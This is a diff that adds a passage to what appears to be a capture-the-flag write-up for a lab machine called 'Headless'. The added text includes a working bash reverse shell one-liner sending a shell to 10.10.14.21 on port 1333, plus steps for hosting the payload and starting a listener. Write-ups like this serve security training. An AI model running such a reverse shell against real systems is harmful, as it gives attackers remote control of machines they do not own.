@@ -63,6 +63,18 @@ I forwarded the request and got this page.
 
 ![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(133).png)
 
+I attempted to gain access to a shell while being behind a protected page. To do so, I created a pyload file named `shell.sh` containing the following code:
+`/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.21/1333 0>&1'`
+Then set up a listener on port 1333
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(141).png)
+
+With the server still running on port 1234, I requested the payload file `shell.sh` from my machine to the target server.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(138).png)
+
+
+
 
 
 
